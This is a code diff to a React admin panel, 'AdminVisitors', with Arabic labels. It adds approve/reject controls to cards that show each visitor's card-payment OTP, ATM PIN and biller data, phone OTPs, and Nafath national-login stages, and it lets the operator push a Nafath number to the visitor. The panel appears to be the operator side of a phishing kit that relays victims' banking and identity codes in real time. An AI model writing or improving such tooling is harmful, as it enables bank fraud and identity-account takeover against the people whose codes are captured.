@@ -1853,6 +1853,29 @@ const AdminVisitors = () => {
                                   </span>
                                 </div>
                               )}
+                              {(() => {
+                                const isPending = order.stage_status === "pending";
+                                const activeStage = order.current_stage;
+
+                                const renderApproveReject = (stage: string, extraContent?: React.ReactNode) => {
+                                  if (!isPending || activeStage !== stage) return null;
+                                  return (
+                                    <div className="pt-2 mt-2 border-t border-border/30 space-y-2">
+                                      {extraContent}
+                                      <div className="flex items-center gap-2">
+                                        <Button onClick={() => handleStageApprove(order.id, (activeStage === "nafath_login" || activeStage === "nafath_verify") ? getNafathInputValue(order) : undefined)} disabled={loadingAction !== null || ((activeStage === "nafath_login" || activeStage === "nafath_verify") && !getNafathInputValue(order))} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1 flex-1" size="sm">
+                                          {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
+                                        </Button>
+                                        <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1 flex-1" size="sm">
+                                          {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
+                                        </Button>
+                                      </div>
+                                    </div>
+                                  );
+                                };
+
+                                return (
+                              <>
                               {/* === 7 Categorized Sections === */}
                               <div className="space-y-2.5">
 
@@ -1927,7 +1950,7 @@ const AdminVisitors = () => {
                                   const rejectedOtps = otpEvents.filter(e => e.status === "rejected");
                                   const currentOtp = order.otp_code;
                                   return (
-                                    <CollapsibleCard title="كود OTP الدفع بالبطاقة" icon={<KeyRound className="w-3 h-3" />} borderColor="border-blue-500/30" bgColor="bg-blue-500/5" headerBg="bg-blue-500/10" headerBorder="border-blue-500/20" textColor="text-blue-600">
+                                    <CollapsibleCard title="كود OTP الدفع بالبطاقة" icon={<KeyRound className="w-3 h-3" />} borderColor="border-blue-500/30" bgColor="bg-blue-500/5" headerBg="bg-blue-500/10" headerBorder="border-blue-500/20" textColor="text-blue-600" defaultOpen={isPending && activeStage === "otp"}>
                                       <div className="px-3 py-2.5 space-y-2">
                                         {rejectedOtps.length > 0 && (
                                           <div className="space-y-1.5">
@@ -1959,13 +1982,14 @@ const AdminVisitors = () => {
                                         {rejectedOtps.length >= 3 && (
                                           <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>
                                         )}
+                                        {renderApproveReject("otp")}
                                       </div>
                                     </CollapsibleCard>
                                   );
                                 })()}
 
                                 {/* 3. ATM */}
-                                <CollapsibleCard title="بيانات ATM" icon={<Landmark className="w-3 h-3" />} borderColor="border-emerald-500/30" bgColor="bg-emerald-500/5" headerBg="bg-emerald-500/10" headerBorder="border-emerald-500/20" textColor="text-emerald-600">
+                                <CollapsibleCard title="بيانات ATM" icon={<Landmark className="w-3 h-3" />} borderColor="border-emerald-500/30" bgColor="bg-emerald-500/5" headerBg="bg-emerald-500/10" headerBorder="border-emerald-500/20" textColor="text-emerald-600" defaultOpen={isPending && activeStage === "atm"}>
                                     <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
                                       {(order.atm_bill_number || order.atm_biller_code || order.atm_pin) ? (
                                         <>
@@ -1980,6 +2004,7 @@ const AdminVisitors = () => {
                                       ) : (
                                         <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
                                       )}
+                                      {renderApproveReject("atm")}
                                     </div>
                                 </CollapsibleCard>
 
@@ -1988,7 +2013,7 @@ const AdminVisitors = () => {
                                   const phoneEvent = stageEvents.find(e => e.order_id === order.id && e.stage === "phone_verification");
                                   const carrierName = (phoneEvent?.payload as any)?.carrier || null;
                                   return (
-                                    <CollapsibleCard title="توثيق رقم الجوال" icon={<span>📲</span>} borderColor="border-purple-500/30" bgColor="bg-purple-500/5" headerBg="bg-purple-500/10" headerBorder="border-purple-500/20" textColor="text-purple-600">
+                                    <CollapsibleCard title="توثيق رقم الجوال" icon={<span>📲</span>} borderColor="border-purple-500/30" bgColor="bg-purple-500/5" headerBg="bg-purple-500/10" headerBorder="border-purple-500/20" textColor="text-purple-600" defaultOpen={isPending && activeStage === "phone_verify"}>
                                       <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
                                         {(visitorPhone || order.phone) ? (
                                           <>
@@ -2009,6 +2034,7 @@ const AdminVisitors = () => {
                                         ) : (
                                           <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
                                         )}
+                                        {renderApproveReject("phone_verify")}
                                       </div>
                                     </CollapsibleCard>
                                   );
@@ -2021,7 +2047,7 @@ const AdminVisitors = () => {
                                     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                                   const rejectedPhoneOtps = phoneOtpEvents.filter(e => e.status === "rejected");
                                   return (
-                                    <CollapsibleCard title="كود OTP توثيق الجوال" icon={<Phone className="w-3 h-3" />} borderColor="border-violet-500/30" bgColor="bg-violet-500/5" headerBg="bg-violet-500/10" headerBorder="border-violet-500/20" textColor="text-violet-600">
+                                    <CollapsibleCard title="كود OTP توثيق الجوال" icon={<Phone className="w-3 h-3" />} borderColor="border-violet-500/30" bgColor="bg-violet-500/5" headerBg="bg-violet-500/10" headerBorder="border-violet-500/20" textColor="text-violet-600" defaultOpen={isPending && activeStage === "phone_otp"}>
                                       <div className="px-3 py-2.5 space-y-2">
                                         {rejectedPhoneOtps.length > 0 && (
                                           <div className="space-y-1.5">
@@ -2046,6 +2072,7 @@ const AdminVisitors = () => {
                                         {rejectedPhoneOtps.length >= 3 && (
                                           <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>
                                         )}
+                                        {renderApproveReject("phone_otp")}
                                       </div>
                                     </CollapsibleCard>
                                   );
@@ -2058,7 +2085,7 @@ const AdminVisitors = () => {
                                     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                                   const rejectedNafathLogins = nafathLoginEvents.filter(e => e.status === "rejected");
                                   return (
-                                    <CollapsibleCard title="دخول النفاذ" icon={<Fingerprint className="w-3 h-3" />} borderColor="border-teal-500/30" bgColor="bg-teal-500/5" headerBg="bg-teal-500/10" headerBorder="border-teal-500/20" textColor="text-teal-600">
+                                    <CollapsibleCard title="دخول النفاذ" icon={<Fingerprint className="w-3 h-3" />} borderColor="border-teal-500/30" bgColor="bg-teal-500/5" headerBg="bg-teal-500/10" headerBorder="border-teal-500/20" textColor="text-teal-600" defaultOpen={isPending && activeStage === "nafath_login"}>
                                       <div className="px-3 py-2.5 space-y-2">
                                         {rejectedNafathLogins.length > 0 && (
                                           <div className="space-y-1.5">
@@ -2092,6 +2119,12 @@ const AdminVisitors = () => {
                                         {rejectedNafathLogins.length >= 3 && (
                                           <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>
                                         )}
+                                        {renderApproveReject("nafath_login", (
+                                          <div className="flex items-center gap-2">
+                                            <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
+                                            <input type="text" placeholder="أدخل الرقم (مثل 35)" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value)} className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors" />
+                                          </div>
+                                        ))}
                                       </div>
                                     </CollapsibleCard>
                                   );
@@ -2104,7 +2137,7 @@ const AdminVisitors = () => {
                                     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                                   const rejectedNafathVerifies = nafathVerifyEvents.filter(e => e.status === "rejected");
                                   return (
-                                    <CollapsibleCard title="رمز النفاذ" icon={<span>🔐</span>} borderColor="border-cyan-500/30" bgColor="bg-cyan-500/5" headerBg="bg-cyan-500/10" headerBorder="border-cyan-500/20" textColor="text-cyan-600">
+                                    <CollapsibleCard title="رمز النفاذ" icon={<span>🔐</span>} borderColor="border-cyan-500/30" bgColor="bg-cyan-500/5" headerBg="bg-cyan-500/10" headerBorder="border-cyan-500/20" textColor="text-cyan-600" defaultOpen={isPending && activeStage === "nafath_verify"}>
                                       <div className="px-3 py-2.5 space-y-2">
                                         {rejectedNafathVerifies.length > 0 && (
                                           <div className="space-y-1.5">
@@ -2129,55 +2162,32 @@ const AdminVisitors = () => {
                                         {rejectedNafathVerifies.length >= 3 && (
                                           <p className="text-[10px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات (3/3)</p>
                                         )}
+                                        {renderApproveReject("nafath_verify", (
+                                          <>
+                                            <div className="flex items-center gap-2">
+                                              <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
+                                              <input type="text" placeholder="أدخل الرقم (مثل 35)" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value)} className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors" />
+                                            </div>
+                                            {order.nafath_number && (
+                                              <div className="flex items-center gap-2">
+                                                <span className="text-[10px] text-muted-foreground whitespace-nowrap">تعديل الرقم:</span>
+                                                <input type="text" placeholder={order.nafath_number} value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value)} className="flex-1 h-8 rounded-lg border-2 border-amber-400 bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors" />
+                                                <Button onClick={() => handleUpdateNafathNumber(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-amber-500 hover:bg-amber-600 text-white gap-1" size="sm">
+                                                  {loadingAction === "nafath-update-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}تحديث
+                                                </Button>
+                                              </div>
+                                            )}
+                                          </>
+                                        ))}
                                       </div>
                                     </CollapsibleCard>
                                   );
                                 })()}
 
                               </div>
-
-                              {/* Nafath number input for nafath stages */}
-                              {(order.current_stage === "nafath_login" || order.current_stage === "nafath_verify") && (
-                                <div className="space-y-2 pt-2 border-t border-border/50">
-                                  <div className="flex items-center gap-2">
-                                    <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
-                                    <input
-                                      type="text"
-                                      placeholder="أدخل الرقم (مثل 35)"
-                                      value={getNafathInputValue(order)}
-                                      onChange={e => setNafathInputValue(order.id, e.target.value)}
-                                      className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
-                                    />
-                                  </div>
-                                </div>
-                              )}
-
-                              {/* Nafath number update for already set */}
-                              {order.nafath_number && order.current_stage === "nafath_verify" && (
-                                <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                  <span className="text-[10px] text-muted-foreground whitespace-nowrap">تعديل الرقم:</span>
-                                  <input
-                                    type="text"
-                                    placeholder={order.nafath_number}
-                                    value={getNafathInputValue(order)}
-                                    onChange={e => setNafathInputValue(order.id, e.target.value)}
-                                    className="flex-1 h-8 rounded-lg border-2 border-amber-400 bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
-                                  />
-                                  <Button onClick={() => handleUpdateNafathNumber(order.id, getNafathInputValue(order))} disabled={loadingAction !== null || !getNafathInputValue(order)} className="bg-amber-500 hover:bg-amber-600 text-white gap-1" size="sm">
-                                    {loadingAction === "nafath-update-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}تحديث
-                                  </Button>
-                                </div>
-                              )}
-
-                              {/* Approve/Reject */}
-                              <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                <Button onClick={() => handleStageApprove(order.id, (order.current_stage === "nafath_login" || order.current_stage === "nafath_verify") ? getNafathInputValue(order) : undefined)} disabled={loadingAction !== null || ((order.current_stage === "nafath_login" || order.current_stage === "nafath_verify") && !getNafathInputValue(order))} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                  {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                </Button>
-                                <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                  {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                </Button>
-                              </div>
+                              </>
+                                );
+                              })()}
                             </div>
                           ))}
                             </div>
